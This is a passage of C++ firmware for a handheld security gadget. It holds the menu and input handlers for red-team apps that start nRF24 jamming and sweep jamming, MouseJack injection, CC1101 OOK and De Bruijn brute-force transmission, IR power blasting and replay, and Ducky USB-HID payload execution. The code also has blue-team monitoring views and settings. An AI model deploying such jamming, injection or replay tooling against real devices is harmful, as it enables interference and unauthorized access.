      drawNrf24OpsMenuScreen(mode);
      return true;
    }
    if (cycleSort) {
      g_redNrfOpsChannel = (g_redNrfOpsChannel + 10) % 126;
      drawNrf24OpsMenuScreen(mode);
      return true;
    }
    if (rescanPressed) {
      g_redNrfOpsChannel = g_redNrfOpsChannel >= 10 ? g_redNrfOpsChannel - 10 : 0;
      drawNrf24OpsMenuScreen(mode);
      return true;
    }
    if (selectPressed) {
      switch (g_redNrfOpsMenuSel) {
        case 0: {  // Channel Scan
          M5.Display.fillScreen(themeModeBg(mode));
          M5.Display.fillRect(0, 0, kScreenW, 22, themeModePanel(mode));
          M5.Display.drawFastHLine(0, 22, kScreenW, themeModeAccent(mode));
          M5.Display.setTextColor(kGold, themeModePanel(mode));
          M5.Display.setTextSize(1);
          M5.Display.setCursor(8, 8);
          M5.Display.println("nRF24 CHANNEL SCAN");
          M5.Display.fillRoundRect(8, 26, 224, 78, 3, kPanelAlt);
          M5.Display.setTextColor(kGold, kPanelAlt);
          M5.Display.setCursor(14, 50);
          M5.Display.println("Scanning 126 channels...");
          M5.Display.display();
          hardwareNrf24FullSweepScan(g_redNrfScanMap);
          g_redNrfScanned = true;
          g_redNrfOpsState = Nrf24OpsState::Scanning;
          drawNrf24OpsScreen(mode);
          break;
        }
        case 1:  // Jam Channel
          g_redNrfOpsState = Nrf24OpsState::Jamming;
          g_redNrfOpsSweepMode = false;
          g_redNrfOpsJamCount = 0;
          g_redNrfOpsStartMs = millis();
          hardwareNrf24StartJam(g_redNrfOpsChannel);
          drawNrf24OpsScreen(mode);
          break;
        case 2:  // Sweep Jam
          g_redNrfOpsState = Nrf24OpsState::Jamming;
          g_redNrfOpsSweepMode = true;
          g_redNrfOpsSweepCh = 0;
          g_redNrfOpsJamCount = 0;
          g_redNrfOpsStartMs = millis();
          hardwareNrf24StartJam(0);
          drawNrf24OpsScreen(mode);
          break;
        case 3: {  // Sniff Raw → channel scan + show results
          M5.Display.fillScreen(themeModeBg(mode));
          M5.Display.fillRect(0, 0, kScreenW, 22, themeModePanel(mode));
          M5.Display.drawFastHLine(0, 22, kScreenW, themeModeAccent(mode));
          M5.Display.setTextColor(kGold, themeModePanel(mode));
          M5.Display.setTextSize(1);
          M5.Display.setCursor(8, 8);
          M5.Display.println("nRF24 SNIFF RAW");
          M5.Display.fillRoundRect(8, 26, 224, 78, 3, kPanelAlt);
          M5.Display.setTextColor(kGold, kPanelAlt);
          M5.Display.setCursor(14, 50);
          M5.Display.println("Sweeping for RPD hits...");
          M5.Display.display();
          hardwareNrf24FullSweepScan(g_redNrfScanMap);
          g_redNrfScanned = true;
          g_redNrfOpsState = Nrf24OpsState::Scanning;
          drawNrf24OpsScreen(mode);
          break;
        }
        case 4:  // MouseJack
          g_redNrfOpsState = Nrf24OpsState::MouseJack;
          g_mjPhase = MouseJackPhase::Scanning;
          g_mjInjectCount = 0;
          drawNrf24OpsScreen(mode);
          break;
      }
      return true;
    }
    return true;
  }

  // ─── RF Tools (Red team) ───
  if (mode == TeamMode::Red && appId == AppId::RfTools) {
    if (g_rfToolsState == RfToolsState::OokTx) {
      hardwareCc1101SendOokBurst(kOokPatternBytes[g_ookPatternSel]);
      ++g_ookBurstCount;
      drawOokTxScreen(mode);
      if (backPressed) {
        hardwareCc1101StopOok();
        g_rfToolsState = RfToolsState::Menu;
        drawRfToolsMenuScreen(mode);
      }
      return true;
    }
    if (g_rfToolsState == RfToolsState::DeBruijnTx) {
      hardwareCc1101SendLfsrBurst(g_dbCodeBits, g_dbLfsrState);
      ++g_dbBurstCount;
      drawDeBruijnScreen(mode);
      if (backPressed) {
        hardwareCc1101StopOok();
        g_rfToolsState = RfToolsState::Menu;
        drawRfToolsMenuScreen(mode);
      }
      return true;
    }
    if (g_rfToolsState == RfToolsState::RawIrTx) {
      if (backPressed) {
        irDeinit();
        g_rfToolsState = RfToolsState::Menu;
        drawRfToolsMenuScreen(mode);
        return true;
      }
      if (moveUp) {
        if (g_rawIrField == 0) g_rawIrAddr++;
        else g_rawIrCmd++;
        drawRawIrTxScreen(mode);
        return true;
      }
      if (moveDown) {
        if (g_rawIrField == 0) g_rawIrAddr--;
        else g_rawIrCmd--;
        drawRawIrTxScreen(mode);
        return true;
      }
      if (cycleSort) {  // 's' — switch field
        g_rawIrField = g_rawIrField == 0 ? 1 : 0;
        drawRawIrTxScreen(mode);
        return true;
      }
      if (rescanPressed) {  // 'r' — step by 0x10
        if (g_rawIrField == 0) g_rawIrAddr += 0x0100;
        else g_rawIrCmd += 0x10;
        drawRawIrTxScreen(mode);
        return true;
      }
      if (selectPressed) {
        irInit();
        irSendNec(g_rawIrAddr, g_rawIrCmd);
        ++g_rawIrSendCount;
        drawRawIrTxScreen(mode);
        return true;
      }
      return true;
    }
    // Menu state
    if (backPressed) return false;
    if (moveUp   && g_rfToolsMenuSel > 0) { --g_rfToolsMenuSel; drawRfToolsMenuScreen(mode); return true; }
    if (moveDown && g_rfToolsMenuSel < 2) { ++g_rfToolsMenuSel; drawRfToolsMenuScreen(mode); return true; }
    if (cycleSort) {  // 's' — cycle config for selected tool
      if (g_rfToolsMenuSel == 0) g_ookBandIndex = (g_ookBandIndex + 1) % 4;
      if (g_rfToolsMenuSel == 1) g_dbBandIndex  = (g_dbBandIndex  + 1) % 4;
      drawRfToolsMenuScreen(mode);
      return true;
    }
    if (rescanPressed) {  // 'r' — cycle secondary config
      if (g_rfToolsMenuSel == 0) g_ookPatternSel = (g_ookPatternSel + 1) % 4;
      if (g_rfToolsMenuSel == 1) {
        int idx = (g_dbCodeBits == 8 ? 0 : g_dbCodeBits == 10 ? 1 : 2);
        idx = (idx + 1) % 3;
        g_dbCodeBits = kDbBitVals[idx];
      }
      drawRfToolsMenuScreen(mode);
      return true;
    }
    if (selectPressed) {
      switch (g_rfToolsMenuSel) {
        case 0:  // OOK Blast
          hardwareCc1101StartOok(atoi(g_cc1101Bands[g_ookBandIndex]), g_cfgOokRate);
          g_rfToolsState = RfToolsState::OokTx;
          g_ookBurstCount = 0;
          g_ookStartMs = millis();
          drawOokTxScreen(mode);
          break;
        case 1:  // De Bruijn
          hardwareCc1101StartOok(atoi(g_cc1101Bands[g_dbBandIndex]), g_cfgOokRate);
          g_rfToolsState = RfToolsState::DeBruijnTx;
          g_dbBurstCount = 0;
          g_dbLfsrState  = 0;
          g_dbStartMs = millis();
          drawDeBruijnScreen(mode);
          break;
        case 2:  // Raw IR TX
          g_rfToolsState = RfToolsState::RawIrTx;
          g_rawIrField = 0;
          g_rawIrSendCount = 0;
          irInit();
          drawRawIrTxScreen(mode);
          break;
      }
      return true;
    }
    return true;
  }

  // ─── IR Toolkit (Red team) ───
  if (mode == TeamMode::Red && appId == AppId::IrToolkit) {
    if (g_irState == IrState::Blasting) {
      tickIrBlast();
      drawIrBlastScreen(mode);
      if (backPressed) {
        irDeinit();
        g_irState = IrState::Menu;
        drawIrToolkitScreen(mode);
      }
      return true;
    }
    if (g_irState == IrState::Receiving) {
      if (backPressed) {
        irDeinit();
        g_irState = IrState::Menu;
        drawIrToolkitScreen(mode);
        return true;
      }
      if (rescanPressed) {
        // Fn+R = open SD file browser
        irScanSdFiles();
        g_irSdFileSel = 0;
        g_irSdMsg[0] = '\0';
        g_irState = IrState::SdReplay;
        drawIrToolkitScreen(mode);
        return true;
      }
      if (deletePressed && g_irHasCapture) {
        // Fn+D = save raw capture to SD
        if (irSaveToSd(g_irRawCapture, g_irLastReceived.valid ? &g_irLastReceived : nullptr)) {
          irScanSdFiles();
          IrReceived parsed = {false, 0, 0, 0};
          const bool savedDecoded = g_irLastReceived.valid || irDecodeRawNecCapture(g_irRawCapture, parsed);
          if (savedDecoded) {
            snprintf(g_irSdMsg, sizeof(g_irSdMsg), "Saved NEC (%d files)", g_irSdFileCount);
          } else {
            snprintf(g_irSdMsg, sizeof(g_irSdMsg), "Saved raw (%d pulses, %d files)",
              g_irRawCapture.count, g_irSdFileCount);
          }
        } else {
          snprintf(g_irSdMsg, sizeof(g_irSdMsg), "Save failed - SD card?");
        }
        drawIrRxScreen(mode);
        return true;
      }
      if (cycleSort && g_irHasCapture) {
        // Fn+S = listen again (discard capture)
        g_irHasCapture = false;
        g_irRxAttempts = 0;
        g_irSdMsg[0] = '\0';
        drawIrRxScreen(mode);
        return true;
      }
      if (selectPressed) {
        if (g_irHasCapture) {
          // Replay the captured raw signal
          if (g_irLastReceived.valid) {
            irInit();
            irSendNec(g_irLastReceived.addr, g_irLastReceived.cmd);
            ++g_irRepeatCount;
            snprintf(g_irSdMsg, sizeof(g_irSdMsg), "TX NEC %04X/%02X",
              g_irLastReceived.addr, g_irLastReceived.cmd);
          } else {
            irReplayRaw(g_irRawCapture);
            ++g_irRepeatCount;
            snprintf(g_irSdMsg, sizeof(g_irSdMsg), "TX raw %d pulses", g_irRawCapture.count);
          }
        } else {
          // Explicit capture attempt: record first, then try to decode the capture.
          ++g_irRxAttempts;
          irInit();
          g_irRawCapture = irCaptureRaw(2000);
          if (g_irRawCapture.valid) {
            g_irHasCapture = true;
            g_irSdMsg[0] = '\0';
            g_irLastReceived = {false, 0, 0, 0};
            irDecodeRawNecCapture(g_irRawCapture, g_irLastReceived);
          }
        }
        drawIrRxScreen(mode);
        return true;
      }
      // Periodic refresh — just redraw, no capture attempt
      drawIrRxScreen(mode);
      return true;
    }
    if (g_irState == IrState::SdReplay) {
      if (deletePressed && g_irSdFileCount > 0) {
        SD.remove(g_irSdFiles[g_irSdFileSel]);
        irScanSdFiles();
        if (g_irSdFileSel >= g_irSdFileCount) {
          g_irSdFileSel = g_irSdFileCount > 0 ? g_irSdFileCount - 1 : 0;
        }
        snprintf(g_irSdMsg, sizeof(g_irSdMsg), "Deleted. %d files left", g_irSdFileCount);
        drawIrSdReplayScreen(mode);
        return true;
      }
      if (backPressed) {
        g_irState = IrState::Receiving;
        g_irSdMsg[0] = '\0';
        drawIrToolkitScreen(mode);
        return true;
      }
      if (renamePressed && g_irSdFileCount > 0) {
        renameBegin(g_irSdFiles[g_irSdFileSel], "/ir", ".bin");
        g_irState = IrState::Rename;
        drawIrToolkitScreen(mode); return true;
      }
      if (rescanPressed) {
        irScanSdFiles();
        g_irSdFileSel = 0;
        g_irSdMsg[0] = '\0';
        drawIrSdReplayScreen(mode);
        return true;
      }
      if (moveUp && g_irSdFileSel > 0) {
        --g_irSdFileSel;
        drawIrSdReplayScreen(mode);
        return true;
      }
      if (moveDown && g_irSdFileSel < g_irSdFileCount - 1) {
        ++g_irSdFileSel;
        drawIrSdReplayScreen(mode);
        return true;
      }
      if (selectPressed && g_irSdFileCount > 0) {
        if (irReplayFromSd(g_irSdFiles[g_irSdFileSel], g_irSdMsg, sizeof(g_irSdMsg))) {
          ++g_irRepeatCount;
        }
        drawIrSdReplayScreen(mode);
        return true;
      }
      drawIrSdReplayScreen(mode);
      return true;
    }
    if (g_irState == IrState::Rename) {
      if (g_appTypedChar) { renameHandleChar(); drawIrToolkitScreen(mode); return true; }
      if (g_appTypedBackspace && g_renameLen > 0) {
        g_renameBuffer[--g_renameLen] = '\0';
        drawIrToolkitScreen(mode); return true;
      }
      if (backPressed) {
        g_irState = IrState::SdReplay; g_irSdMsg[0] = '\0';
        drawIrToolkitScreen(mode); return true;
      }
      if (selectPressed && g_renameLen > 0) {
        if (renameCommit()) {
          irScanSdFiles();
          snprintf(g_irSdMsg, sizeof(g_irSdMsg), "Renamed OK");
        } else {
          snprintf(g_irSdMsg, sizeof(g_irSdMsg), "Rename failed");
        }
        g_irState = IrState::SdReplay;
        drawIrToolkitScreen(mode); return true;
      }
      return true;
    }
    // Menu state
    if (backPressed) return false;
    if (moveUp) {
      if (g_irMenuSel > 0) --g_irMenuSel;
      drawIrMenuScreen(mode);
      return true;
    }
    if (moveDown) {
      if (g_irMenuSel < 4) ++g_irMenuSel;
      drawIrMenuScreen(mode);
      return true;
    }
    if (selectPressed) {
      switch (g_irMenuSel) {
        case 0:  // TV Power Blast
          irInit();
          g_irState = IrState::Blasting;
          g_irBlastAc = false;
          g_irBlastUniversal = false;
          g_irBlastIndex = 0;
          g_irBlastCount = 0;
          g_irBlastStartMs = millis();
          drawIrToolkitScreen(mode);
          break;
        case 1:  // AC Power Blast
          irInit();
          g_irState = IrState::Blasting;
          g_irBlastAc = true;
          g_irBlastUniversal = false;
          g_irBlastIndex = 0;
          g_irBlastCount = 0;
          g_irBlastStartMs = millis();
          drawIrToolkitScreen(mode);
          break;
        case 2:  // Universal Blast (TV then AC)
          irInit();
          g_irState = IrState::Blasting;
          g_irBlastAc = false;
          g_irBlastUniversal = true;
          g_irBlastIndex = 0;
          g_irBlastCount = 0;
          g_irBlastStartMs = millis();
          drawIrToolkitScreen(mode);
          break;
        case 3:  // Capture Code
          irInit();
          g_irState = IrState::Receiving;
          g_irRxStartMs = millis();
          g_irRxAttempts = 0;
          drawIrToolkitScreen(mode);
          break;
        case 4:  // SD Replay
          irScanSdFiles();
          g_irSdFileSel = 0;
          g_irSdMsg[0] = '\0';
          g_irState = IrState::SdReplay;
          drawIrToolkitScreen(mode);
          break;
      }
      return true;
    }
    return true;
  }

  // ─── Payloads (Red team file-browser USB-HID flow) ───
  if (mode == TeamMode::Red && appId == AppId::Payloads) {
    if (!g_plScanned) {
      plScanFiles();
      g_plScanned = true;
      g_plState = ensureSdMounted() ? PayloadState::FileList : PayloadState::NoCard;
      drawPayloadsScreen(mode);
      return true;
    }
    if (backPressed) {
      if (g_plState == PayloadState::Done || g_plState == PayloadState::NoCard) {
        g_plState = PayloadState::FileList;
        drawPayloadsScreen(mode);
        return true;
      }
      return false;
    }
    if (rescanPressed) {
      plScanFiles();
      g_plState = ensureSdMounted() ? PayloadState::FileList : PayloadState::NoCard;
      drawPayloadsScreen(mode);
      return true;
    }
    if (g_plState == PayloadState::Running) return true;
    if (g_plState == PayloadState::NoCard) return true;
    if (g_plState == PayloadState::Done) {
      if (selectPressed && g_plFileSel < g_plFileCount) {
        usbHidInit();
        g_plState = PayloadState::Running;
        drawPayloadsScreen(mode);
        M5.Display.display();
        DuckyResult res = usbHidRunScript(g_plFiles[g_plFileSel]);
        g_plLinesRun = res.linesRun;
        snprintf(g_plLastError, sizeof(g_plLastError), "%s", res.ok ? "" : res.error);
        g_plState = PayloadState::Done;
        drawPayloadsScreen(mode);
        return true;
      }
      return true;
    }
    if (moveUp && g_plFileSel > 0) {
      --g_plFileSel;
      if (g_plFileSel < g_plFileScroll) g_plFileScroll = g_plFileSel;
      drawPayloadsScreen(mode);
      return true;
    }
    if (moveDown && g_plFileSel < g_plFileCount - 1) {
      ++g_plFileSel;
      constexpr int kVisible = 5;
      if (g_plFileSel >= g_plFileScroll + kVisible) g_plFileScroll = g_plFileSel - kVisible + 1;
      drawPayloadsScreen(mode);
      return true;
    }
    if (selectPressed && g_plFileSel < g_plFileCount) {
      usbHidInit();
      g_plState = PayloadState::Running;
      drawPayloadsScreen(mode);
      M5.Display.display();
      DuckyResult res = usbHidRunScript(g_plFiles[g_plFileSel]);
      g_plLinesRun = res.linesRun;
      snprintf(g_plLastError, sizeof(g_plLastError), "%s", res.ok ? "" : res.error);
      g_plState = PayloadState::Done;
      drawPayloadsScreen(mode);
      return true;
    }
    return true;
  }

  if (appId == AppId::Settings) {
    if (g_cfgAbout) {
      if (backPressed) {
        g_cfgAbout = false;
        drawConfigScreen(mode);
        return true;
      }
      return true;
    }
    // Main config menu
    constexpr int kCfgItems = static_cast<int>(sizeof(kCfgItemLabels) / sizeof(kCfgItemLabels[0]));
    if (moveUp) {
      if (g_cfgMenuSel > 0) --g_cfgMenuSel;
      drawConfigScreen(mode);
      return true;
    }
    if (moveDown) {
      if (g_cfgMenuSel < kCfgItems - 1) ++g_cfgMenuSel;
      drawConfigScreen(mode);
      return true;
    }
    // S = decrease / prev value
    if (cycleSort) {
      switch (g_cfgMenuSel) {
        case 0: if (g_cfgBrightness >  8) g_cfgBrightness -= 8; break;
        case 1: g_cfgStartTeam = g_cfgStartTeam == 0 ? 1 : 0; break;
        case 2: if (g_cfgBleName > 0) --g_cfgBleName; break;
        case 3: if (g_cfgOokRate > 0) --g_cfgOokRate; break;
        case 4: if (g_cfgDefaultBand > 0) --g_cfgDefaultBand; break;
        case 5: if (g_cfgCaptureRssi > 0) --g_cfgCaptureRssi; break;
        case 6: if (g_cfgNfcTimeout > 0) --g_cfgNfcTimeout; break;
        case 7: g_cfgGpsUnits = g_cfgGpsUnits == 0 ? 1 : 0; break;
        case 8: g_cfgAbout = true; break;
      }
      settingsSave();
      settingsApply();
      drawConfigScreen(mode);
      return true;
    }
    // R = increase / next value
    if (rescanPressed) {
      switch (g_cfgMenuSel) {
        case 0: if (g_cfgBrightness < 248) g_cfgBrightness += 8; break;
        case 1: g_cfgStartTeam = g_cfgStartTeam == 0 ? 1 : 0; break;
        case 2: if (g_cfgBleName < 3) ++g_cfgBleName; break;
        case 3: if (g_cfgOokRate < 2) ++g_cfgOokRate; break;
        case 4: if (g_cfgDefaultBand < 3) ++g_cfgDefaultBand; break;
        case 5: if (g_cfgCaptureRssi < 3) ++g_cfgCaptureRssi; break;
        case 6: if (g_cfgNfcTimeout < 2) ++g_cfgNfcTimeout; break;
        case 7: g_cfgGpsUnits = g_cfgGpsUnits == 0 ? 1 : 0; break;
        case 8: g_cfgAbout = true; break;
      }
      settingsSave();
      settingsApply();
      drawConfigScreen(mode);
      return true;
    }
    // Enter = toggle/open
    if (selectPressed) {
      switch (g_cfgMenuSel) {
        case 0: break;  // brightness changed with S/R
        case 1: g_cfgStartTeam = g_cfgStartTeam == 0 ? 1 : 0; settingsSave(); settingsApply(); break;
        case 2: g_cfgBleName = (g_cfgBleName + 1) % 4; settingsSave(); settingsApply(); break;
        case 3: g_cfgOokRate = (g_cfgOokRate + 1) % 3; settingsSave(); settingsApply(); break;
        case 4: g_cfgDefaultBand = (g_cfgDefaultBand + 1) % 4; settingsSave(); settingsApply(); break;
        case 5: g_cfgCaptureRssi = (g_cfgCaptureRssi + 1) % 4; settingsSave(); settingsApply(); break;
        case 6: g_cfgNfcTimeout = (g_cfgNfcTimeout + 1) % 3; settingsSave(); settingsApply(); break;
        case 7: g_cfgGpsUnits = g_cfgGpsUnits == 0 ? 1 : 0; settingsSave(); settingsApply(); break;
        case 8: g_cfgAbout = true; break;
      }
      drawConfigScreen(mode);
      return true;
    }
    return true;
  }

  return false;
}

bool appNeedsPeriodicRefresh(TeamMode mode, AppId appId) {
    if (mode == TeamMode::Red && appId == AppId::WifiOps) {
      return g_redWifiState == WifiOpsState::Attacking;
  }
  if (mode == TeamMode::Red && appId == AppId::BleOps) {
    return g_redBleState == BleOpsState::Attacking;
  }
  if (mode == TeamMode::Red && appId == AppId::Cc1101Ops) {
    return g_redCc1101State == Cc1101OpsState::Jamming ||
           g_redCc1101State == Cc1101OpsState::Monitoring;
  }
  if (mode == TeamMode::Red && appId == AppId::Nrf24Ops) {
    return g_redNrfOpsState == Nrf24OpsState::Jamming;
  }
  if (mode == TeamMode::Red && appId == AppId::RfTools) {
    return g_rfToolsState == RfToolsState::OokTx ||
           g_rfToolsState == RfToolsState::DeBruijnTx;
  }
    if (mode == TeamMode::Red && appId == AppId::IrToolkit) {
      return g_irState == IrState::Blasting;
    }
    if (mode == TeamMode::Blue && appId == AppId::Cc1101Scan) {
      return g_blueCc1101View == BlueCc1101View::Spectrum ||
             g_blueCc1101View == BlueCc1101View::Waterfall ||
             (g_blueCc1101View == BlueCc1101View::Capture && !g_blueHasCapture);
    }
    if (mode == TeamMode::Blue && appId == AppId::GpsMonitor) {
      return g_blueGpsView != BlueGpsView::Menu;
    }
    if (mode == TeamMode::Blue && appId == AppId::NrfAnalyzer) {
      return true;
    }
    if (mode == TeamMode::Blue && appId == AppId::NfcScanner) {
      return g_nfcView == NfcView::Scanning || g_nfcView == NfcView::Emulating;
    }
    return false;
  }

  void appOnExit(TeamMode mode, AppId appId) {
  if (mode == TeamMode::Red && appId == AppId::WifiOps) {
    stopRedWifiAttack();
    g_redWifiState = WifiOpsState::MainMenu;
  }
  if (mode == TeamMode::Red && appId == AppId::BleOps) {
    stopBleAttack();
    g_redBleState = BleOpsState::MainMenu;
  }
  if (mode == TeamMode::Red && appId == AppId::Cc1101Ops) {
    if (g_redCc1101State == Cc1101OpsState::Jamming) hardwareCc1101StopJam();
    g_redCc1101State = Cc1101OpsState::Menu;
    g_redCc1101JamCount = 0;
    g_cc1101SdMsg[0] = '\0';
  }
  if (mode == TeamMode::Red && appId == AppId::Nrf24Ops) {
    if (g_redNrfOpsState == Nrf24OpsState::Jamming) hardwareNrf24StopJam();
    g_redNrfOpsState = Nrf24OpsState::Menu;
    g_redNrfOpsJamCount = 0;
  }
  if (mode == TeamMode::Red && appId == AppId::RfTools) {
    if (g_rfToolsState == RfToolsState::OokTx || g_rfToolsState == RfToolsState::DeBruijnTx) {
      hardwareCc1101StopOok();
    }
    if (g_rfToolsState == RfToolsState::RawIrTx) irDeinit();
    g_rfToolsState = RfToolsState::Menu;
  }
  if (mode == TeamMode::Red && appId == AppId::IrToolkit) {
    irDeinit();
    g_irState = IrState::Menu;
    g_irBlastCount = 0;
  }
  if (mode == TeamMode::Red && appId == AppId::Payloads) {
    g_plState = PayloadState::FileList;
  }
  if (mode == TeamMode::Blue && appId == AppId::WifiMonitor) {
    g_blueWifiView = BlueWifiView::Menu;
  }
  if (mode == TeamMode::Blue && appId == AppId::BleMonitor) {
    g_blueBleView = BlueBleView::Menu;
  }
  if (mode == TeamMode::Blue && appId == AppId::GpsMonitor) {
    g_blueGpsView = BlueGpsView::Menu;
    g_blueGpsMenuIndex = 0;
  }
  if (mode == TeamMode::Blue && appId == AppId::Cc1101Scan) {
    g_blueCc1101View = BlueCc1101View::Menu;
    g_blueCc1101MenuSel = 0;
    g_blueHasCapture = false;
    g_blueRawCapture = {};
    g_blueCaptureCount = 0;
    g_blueCaptureReplays = 0;
    g_cc1101SdMsg[0] = '\0';
  }
    if (mode == TeamMode::Blue && appId == AppId::NrfAnalyzer) {
      g_blueNrfView = BlueNrfView::Spectrum;
    }
    if (mode == TeamMode::Blue && appId == AppId::NfcScanner) {
      g_nfcView = NfcView::Menu;
      g_nfcMenuSel = 0;
      g_nfcMsg[0] = '\0';
      g_nfcReaderReady = false;
      g_nfcLastScanAttemptMs = 0;
      nfcDeinit();
    }
    if (appId == AppId::Files) {
      g_filesView = FilesView::RootMenu;
      g_filesMenuIndex = 0;
      g_filesSelected = 0;
      g_filesScroll = 0;
      g_filesCurrentPath = "/";
      g_filesDeletePath = "";
    }
  }

  void settingsInit() {
    ensureLittleFsMounted();
    settingsLoad();
    settingsApply();
  }

TeamMode settingsDefaultTeam() {
  return g_cfgStartTeam == 0 ? TeamMode::Red : TeamMode::Blue;
}
